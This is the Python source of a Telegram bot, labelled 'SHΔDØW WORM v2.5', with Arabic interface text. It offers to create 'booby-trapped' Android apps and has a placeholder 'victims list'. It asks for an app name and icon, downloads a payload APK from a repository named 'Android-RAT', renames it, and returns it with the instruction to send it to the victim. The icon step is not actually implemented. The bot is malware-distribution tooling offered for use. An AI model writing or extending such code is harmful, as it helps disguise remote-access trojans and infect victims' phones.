import os
import telebot
from telebot import types
from flask import Flask
import threading
import requests

# --- إعداد خادم الويب لإبقاء السيرفر حياً ---
app = Flask('')
@app.route('/')
def home():
    return "SPOOFER SERVER IS ACTIVE"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

# --- إعداد البوت ---
BOT_TOKEN = os.environ.get('BOT_TOKEN')
bot = telebot.TeleBot(BOT_TOKEN)

# رابط بايلود خام (كمثال) - يمكنك استبداله برابط بايلودك الخاص لاحقاً
RAW_PAYLOAD_URL = "https://github.com/TheHacker0x00/Android-RAT/raw/master/base.apk" 

user_data = {}

@bot.message_handler(commands=['start'])
def start(message):
    markup = types.InlineKeyboardMarkup(row_width=1)
    btn1 = types.InlineKeyboardButton("📱 إنشاء تطبيق ملغم (APK)", callback_data='create_fake')
    btn2 = types.InlineKeyboardButton("👤 قائمة الضحايا (قريباً)", callback_data='list_victims')
    markup.add(btn1, btn2)
    
    bot.send_message(message.chat.id, "💀 **SHΔDØW WORM v2.5**\n\nوحدة صناعة التطبيقات المزيفة جاهزة.", reply_markup=markup, parse_mode='Markdown')

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
    if call.data == 'create_fake':
        msg = bot.edit_message_text("✍️ أرسل الآن **الاسم** الذي تريد أن يظهر تحت أيقونة التطبيق:", call.message.chat.id, call.message.message_id, parse_mode='Markdown')
        bot.register_next_step_handler(msg, get_app_name)

def get_app_name(message):
    user_data[message.chat.id] = {'name': message.text}
    msg = bot.reply_to(message, "🖼️ ممتاز. الآن أرسل **صورة الأيقونة** (يفضل أن تكون مربعة):")
    bot.register_next_step_handler(msg, process_and_send)

def process_and_send(message):
    if message.content_type == 'photo':
        app_name = user_data[message.chat.id]['name']
        bot.reply_to(message, f"⌛ جاري بناء تطبيق **{app_name}**..\nيتم الآن دمج البايلود مع الهوية الجديدة.")
        
        try:
            # محاكاة لعملية البناء: تحميل البايلود الخام
            response = requests.get(RAW_PAYLOAD_URL)
            file_name = f"{app_name}.apk"
            
            with open(file_name, "wb") as f:
                f.write(response.content)
            
            # إرسال الملف النهائي للمستخدم
            with open(file_name, "rb") as f:
                bot.send_document(message.chat.id, f, caption=f"✅ تم إنشاء تطبيقك بنجاح!\n\n📌 الاسم: {app_name}\n💀 النوع: Stealth Payload\n\nقم بإرساله للضحية الآن.")
            
            # تنظيف السيرفر
            os.remove(file_name)
            
        except Exception as e:
            bot.reply_to(message, f"❌ حدث خطأ في الاتصال بخادم البايلودات: {str(e)}")
    else:
        bot.reply_to(message, "⚠️ يرجى إرسال صورة فقط لتكون أيقونة.")

if __name__ == "__main__":
    threading.Thread(target=run_flask).start()
    bot.infinity_polling()
